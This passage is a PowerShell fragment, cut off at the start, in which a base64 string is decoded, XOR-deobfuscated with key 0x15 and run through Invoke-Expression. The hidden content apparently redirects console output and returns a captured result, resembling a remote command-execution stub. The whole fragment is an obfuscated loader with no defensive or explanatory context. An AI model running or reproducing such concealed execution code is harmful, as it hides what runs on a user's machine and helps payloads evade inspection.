L0ZwYVpgYT0xRmFnfHtyQmd8YXBnPB8fNTU1NU5GfSFnZVglY3A7RWd6cmd0eEgvL1h0fHs9MVZ6
eHh0e3E7RmV5fGE9NzU3PDwfHzU1NTVOVnp7Znp5cEgvL0ZwYVpgYT0xWnlxVnp7Znp5cFpgYTwf
NTU1NTFHcGZgeWFmNSg1MUZhZ3x7ckJnfGFwZztBekZhZ3x7cj08HzU1NTUxR3BmYHlhZh9o"

$file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
$data = $enc.GetBytes($file)|%{$_-bXor0x15}
iex ([System.Text.Encoding]::ASCII.GetString($data))

